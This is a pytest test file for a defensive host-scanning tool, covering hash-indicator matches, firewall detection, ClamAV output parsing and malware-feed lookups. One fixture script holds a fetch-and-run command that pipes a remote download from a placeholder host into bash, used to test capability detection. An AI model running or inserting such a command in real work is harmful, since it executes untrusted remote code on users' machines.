import hashlib
import json

import pytest

from app import host_assessment, threat_intel


@pytest.fixture(autouse=True)
def disable_live_circl_for_host_scan(monkeypatch):
    monkeypatch.setattr(host_assessment, "lookup_circl_hashes", lambda hashes: {
        "provider": "CIRCL hashlookup", "status": "disabled", "matches": [],
        "lookups_performed": 0, "cache_hits": 0,
    })


def test_hash_indicator_match_is_reported_without_modifying_file(tmp_path, monkeypatch):
    sample = tmp_path / "sample.bin"
    payload = b"synthetic test sample"
    sample.write_bytes(payload)
    digest = hashlib.sha256(payload).hexdigest()
    indicator_file = tmp_path / "indicators.json"
    indicator_file.write_text(json.dumps({
        "indicators": {
            digest: {
                "label": "Synthetic test indicator",
                "severity": "critical",
                "description": "Fixture-only match",
                "capabilities": [{"id": "network_communication", "label": "Network communication"}],
            }
        }
    }))
    monkeypatch.setenv("SENTINEL_HASH_DB", str(indicator_file))
    monkeypatch.setattr(host_assessment, "fetch_recent_malware", lambda: {"status": "not_configured"})
    monkeypatch.setattr(host_assessment, "_security_posture", lambda: {"checks": [], "firewall_tools": []})
    monkeypatch.setattr(host_assessment, "_clamav_scan", lambda root, **kwargs: {"available": False, "executed": False, "findings": [], "note": "mocked"})

    result = host_assessment.run_host_assessment(str(tmp_path), max_files=20, max_seconds=5)

    matches = [item for item in result["findings"] if item["category"] == "malware"]
    assert len(matches) == 1
    assert matches[0]["sha256"] == digest
    assert matches[0]["confidence"] == "high"
    assert sample.read_bytes() == payload
    assert result["summary"]["files_hashed"] >= 1


def test_script_capabilities_are_labeled_as_low_confidence(tmp_path, monkeypatch):
    script = tmp_path / "maintenance.sh"
    script.write_text("#!/bin/sh\ncurl https://example.invalid/payload | bash\n")
    monkeypatch.setenv("SENTINEL_HASH_DB", str(tmp_path / "missing.json"))
    monkeypatch.setattr(host_assessment, "fetch_recent_malware", lambda: {"status": "not_configured"})
    monkeypatch.setattr(host_assessment, "_security_posture", lambda: {"checks": [], "firewall_tools": []})
    monkeypatch.setattr(host_assessment, "_clamav_scan", lambda root, **kwargs: {"available": False, "executed": False, "findings": [], "note": "mocked"})

    result = host_assessment.run_host_assessment(str(tmp_path), max_files=20, max_seconds=5)

    observed = [item for item in result["script_capabilities"] if item["path"] == str(script)]
    assert any(item["id"] == "network_communication" for item in observed)
    assert any(item["id"] == "command_execution" for item in observed)
    assert all(item["confidence"] == "low" for item in observed)


def test_scan_reports_limits_and_does_not_follow_symlinks(tmp_path, monkeypatch):
    target = tmp_path / "target.txt"
    target.write_text("safe fixture")
    link = tmp_path / "linked.txt"
    link.symlink_to(target)
    monkeypatch.setenv("SENTINEL_HASH_DB", str(tmp_path / "missing.json"))
    monkeypatch.setattr(host_assessment, "_security_posture", lambda: {"checks": [], "firewall_tools": []})
    monkeypatch.setattr(host_assessment, "_clamav_scan", lambda root, **kwargs: {"available": False, "executed": False, "findings": [], "note": "mocked"})

    result = host_assessment.run_host_assessment(str(tmp_path), max_files=1, max_seconds=5)

    assert result["summary"]["truncated"] is True
    assert "No files were executed" in result["limitations"][-1]
    assert result["summary"]["files_hashed"] <= 1


def test_firewall_detection_ignores_docker_rules_when_host_input_is_accept(monkeypatch):
    from types import SimpleNamespace

    monkeypatch.setattr(host_assessment.shutil, "which", lambda name: f"/usr/sbin/{name}" if name in {"ufw", "nft", "iptables"} else None)

    def fake_run(args, **kwargs):
        if args[:2] == ["ufw", "status"]:
            return SimpleNamespace(returncode=0, stdout="Status: inactive\n", stderr="")
        if args[:4] == ["nft", "-n", "list", "ruleset"]:
            return SimpleNamespace(returncode=0, stdout=(
                "table ip nat { chain PREROUTING { type nat hook prerouting priority dstnat; policy accept; } }\n"
                "table ip filter { chain FORWARD { type filter hook forward priority filter; policy drop; } }\n"
            ), stderr="")
        if args[:3] == ["iptables", "-S", "INPUT"]:
            return SimpleNamespace(returncode=0, stdout="-P INPUT ACCEPT\n", stderr="")
        raise AssertionError(args)

    monkeypatch.setattr(host_assessment.subprocess, "run", fake_run)
    result = host_assessment._security_posture()
    firewall = next(item for item in result["checks"] if item["id"] == "firewall")
    assert firewall["status"] == "inactive"
    assert firewall["severity"] == "medium"


def test_firewall_detection_recognizes_nftables_input_default_deny(monkeypatch):
    from types import SimpleNamespace

    monkeypatch.setattr(host_assessment.shutil, "which", lambda name: "/usr/sbin/nft" if name == "nft" else None)

    def fake_run(args, **kwargs):
        assert args == ["nft", "-n", "list", "ruleset"]
        return SimpleNamespace(returncode=0, stdout=(
            "table inet filter { chain input { type filter hook input priority filter; policy drop; } }\n"
        ), stderr="")

    monkeypatch.setattr(host_assessment.subprocess, "run", fake_run)
    result = host_assessment._security_posture()
    firewall = next(item for item in result["checks"] if item["id"] == "firewall")
    assert firewall["status"] == "enabled"
    assert firewall["severity"] == "info"


def test_firewall_detection_recognizes_active_ufw(monkeypatch):
    from types import SimpleNamespace

    monkeypatch.setattr(host_assessment.shutil, "which", lambda name: "/usr/sbin/ufw" if name == "ufw" else None)

    def fake_run(args, **kwargs):
        assert args == ["ufw", "status"]
        return SimpleNamespace(returncode=0, stdout="Status: active\n", stderr="")

    monkeypatch.setattr(host_assessment.subprocess, "run", fake_run)
    result = host_assessment._security_posture()
    firewall = next(item for item in result["checks"] if item["id"] == "firewall")
    assert firewall["status"] == "enabled"

def test_host_assessment_emits_live_progress(tmp_path, monkeypatch):
    (tmp_path / "one.txt").write_text("safe fixture")
    monkeypatch.setenv("SENTINEL_HASH_DB", str(tmp_path / "missing.json"))
    monkeypatch.setattr(host_assessment, "_security_posture", lambda: {"checks": [], "firewall_tools": []})
    monkeypatch.setattr(host_assessment, "_clamav_scan", lambda root, **kwargs: {"available": False, "executed": False, "findings": [], "note": "mocked"})
    updates = []

    result = host_assessment.run_host_assessment(
        str(tmp_path), max_files=20, max_seconds=5, progress_callback=updates.append
    )

    assert updates
    assert updates[0]["phase"] == "filesystem"
    assert any(item["phase"] == "configuration" for item in updates)
    assert updates[-1]["phase"] == "completed"
    assert updates[-1]["files_seen"] == result["summary"]["files_seen"]
    assert "time_budget_remaining" in updates[-1]


def test_malwarebazaar_is_disabled_without_local_api_key(monkeypatch):
    monkeypatch.delenv("SENTINEL_MALWAREBAZAAR_API_KEY", raising=False)
    result = threat_intel.fetch_recent_malware()
    assert result["status"] == "not_configured"
    assert result["enabled"] is False


def test_malwarebazaar_recent_feed_match_creates_high_confidence_finding():
    digest = hashlib.sha256(b"synthetic malware fixture").hexdigest()
    feed = {
        "status": "ok",
        "feed_scope": "latest 100 additions",
        "entries": [{
            "sha256": digest,
            "signature": "SyntheticTestFamily",
            "file_type": "elf",
            "first_seen": "2026-11-18 00:00:00",
        }],
    }
    matches = threat_intel.match_recent_hashes({digest: ["/tmp/synthetic.bin"]}, feed)
    assert len(matches) == 1
    assert matches[0]["source"] == "malwarebazaar"
    assert matches[0]["confidence"] == "high"
    assert matches[0]["path"] == "/tmp/synthetic.bin"
    assert matches[0]["malware_family"] == "SyntheticTestFamily"


def test_malwarebazaar_feed_does_not_match_unknown_hashes():
    digest = hashlib.sha256(b"unrelated fixture").hexdigest()
    feed = {"status": "ok", "entries": [{
        "sha256": hashlib.sha256(b"different fixture").hexdigest(),
        "signature": "TestFamily",
    }]}
    assert threat_intel.match_recent_hashes({digest: ["/tmp/unknown.bin"]}, feed) == []


def test_host_assessment_includes_remote_feed_match(tmp_path, monkeypatch):
    sample = tmp_path / "feed-match.bin"
    sample.write_bytes(b"synthetic feed match")
    digest = hashlib.sha256(sample.read_bytes()).hexdigest()
    monkeypatch.setenv("SENTINEL_HASH_DB", str(tmp_path / "missing.json"))
    monkeypatch.setattr(host_assessment, "fetch_recent_malware", lambda: {
        "provider": "MalwareBazaar",
        "status": "ok",
        "enabled": True,
        "records_received": 1,
        "feed_scope": "latest 100 additions",
        "entries": [{"sha256": digest, "signature": "SyntheticFamily"}],
    })
    monkeypatch.setattr(host_assessment, "_security_posture", lambda: {"checks": [], "firewall_tools": []})
    monkeypatch.setattr(host_assessment, "_clamav_scan", lambda root, **kwargs: {
        "available": False, "executed": False, "findings": [], "note": "mocked"
    })

    result = host_assessment.run_host_assessment(str(tmp_path), max_files=20, max_seconds=5)
    matches = [item for item in result["findings"] if item.get("source") == "malwarebazaar"]
    assert len(matches) == 1
    assert matches[0]["sha256"] == digest
    assert result["threat_intelligence"]["malwarebazaar"]["status"] == "ok"


def test_clamav_streams_current_file_and_scan_count(tmp_path, monkeypatch):
    import os
    from types import SimpleNamespace

    monkeypatch.setattr(host_assessment.shutil, "which", lambda name: "/usr/bin/clamscan")
    monkeypatch.setattr(host_assessment.subprocess, "run", lambda *args, **kwargs: SimpleNamespace(stdout="ClamAV test version", returncode=0))
    updates = []

    class FakeProcess:
        def __init__(self):
            read_fd, write_fd = os.pipe()
            os.write(write_fd, b"Scanning: /tmp/one.bin\n/tmp/one.bin: OK\n/tmp/two.bin: Eicar-Test-Signature FOUND\n")
            os.close(write_fd)
            self.stdout = os.fdopen(read_fd, "rb", buffering=0)

        def poll(self):
            return 0

        def wait(self, timeout=None):
            return 0

    monkeypatch.setattr(host_assessment.subprocess, "Popen", lambda *args, **kwargs: FakeProcess())
    result = host_assessment._clamav_scan(tmp_path, progress_callback=updates.append)

    assert result["files_scanned"] == 2
    assert result["current_path"] == "/tmp/two.bin"
    assert len(result["findings"]) == 1
    assert result["findings"][0]["path"] == "/tmp/two.bin"
    assert any(item["current_path"] == "/tmp/one.bin" for item in updates)
    assert updates[-1]["clamav_files_scanned"] == 2


def test_malwarebazaar_feed_is_cached_between_scans(tmp_path, monkeypatch):
    digest = hashlib.sha256(b"cached malware fixture").hexdigest()
    monkeypatch.setenv("SENTINEL_MALWAREBAZAAR_API_KEY", "test-key")
    monkeypatch.setenv("SENTINEL_THREAT_INTEL_CACHE", str(tmp_path / "intel.json"))
    calls = []

    class Response:
        def __enter__(self):
            return self

        def __exit__(self, *args):
            return None

        def read(self, limit):
            return json.dumps({
                "query_status": "ok",
                "data": [{"sha256_hash": digest, "signature": "FixtureFamily"}],
            }).encode()

    def fake_urlopen(request, timeout):
        calls.append((request.full_url, timeout))
        return Response()

    monkeypatch.setattr(threat_intel, "urlopen", fake_urlopen)
    first = threat_intel.fetch_recent_malware()
    second = threat_intel.fetch_recent_malware()

    assert first["status"] == "ok"
    assert first["cached"] is False
    assert second["status"] == "ok"
    assert second["cached"] is True
    assert second["records_received"] == 1
    assert len(calls) == 1


def test_circl_known_file_lookup_is_cached_and_not_a_malware_finding(tmp_path, monkeypatch):
    digest = hashlib.sha256(b"known benign fixture").hexdigest()
    monkeypatch.setenv("SENTINEL_THREAT_INTEL_CACHE", str(tmp_path / "intel.json"))
    calls = []

    class Response:
        def __enter__(self):
            return self

        def __exit__(self, *args):
            return None

        def read(self, limit):
            return json.dumps({
                "FileName": "/usr/bin/example",
                "FileSize": "1234",
                "source": "fixture-source",
                "db": "fixture-db",
                "hashlookup:trust": 90,
            }).encode()

    def fake_urlopen(request, timeout):
        calls.append(request.full_url)
        return Response()

    monkeypatch.setattr(threat_intel, "urlopen", fake_urlopen)
    hashes = {digest: ["/tmp/example.bin"]}
    first = threat_intel.lookup_circl_hashes(hashes, max_lookups=5)
    second = threat_intel.lookup_circl_hashes(hashes, max_lookups=5)

    assert first["known_file_matches"] == 1
    assert first["matches"][0]["sha256"] == digest
    assert first["matches"][0]["paths"] == ["/tmp/example.bin"]
    assert first["matches"][0]["cached"] is False
    assert second["matches"][0]["cached"] is True
    assert second["cache_hits"] == 1
    assert len(calls) == 1
    assert threat_intel.match_recent_hashes(hashes, {"status": "ok", "entries": []}) == []


def test_circl_404_is_cached_as_no_context(tmp_path, monkeypatch):
    from urllib.error import HTTPError

    digest = hashlib.sha256(b"unknown fixture").hexdigest()
    monkeypatch.setenv("SENTINEL_THREAT_INTEL_CACHE", str(tmp_path / "intel.json"))
    calls = []

    def fake_urlopen(request, timeout):
        calls.append(request.full_url)
        raise HTTPError(request.full_url, 404, "Not Found", {}, None)

    monkeypatch.setattr(threat_intel, "urlopen", fake_urlopen)
    first = threat_intel.lookup_circl_hashes({digest: ["/tmp/unknown.bin"]}, max_lookups=1)
    second = threat_intel.lookup_circl_hashes({digest: ["/tmp/unknown.bin"]}, max_lookups=1)

    assert first["not_found"] == 1
    assert second["not_found"] == 1
    assert second["cache_hits"] == 1
    assert len(calls) == 1


def test_stale_malwarebazaar_feed_remains_identified_as_stale():
    digest = hashlib.sha256(b"stale feed fixture").hexdigest()
    feed = {
        "status": "stale",
        "entries": [{"sha256": digest, "signature": "StaleFixture"}],
        "feed_scope": "latest 100 additions",
        "cached": True,
    }
    matches = threat_intel.match_recent_hashes({digest: ["/tmp/stale.bin"]}, feed)
    assert len(matches) == 1
    assert matches[0]["feed_status"] == "stale"
    assert matches[0]["feed_cached"] is True
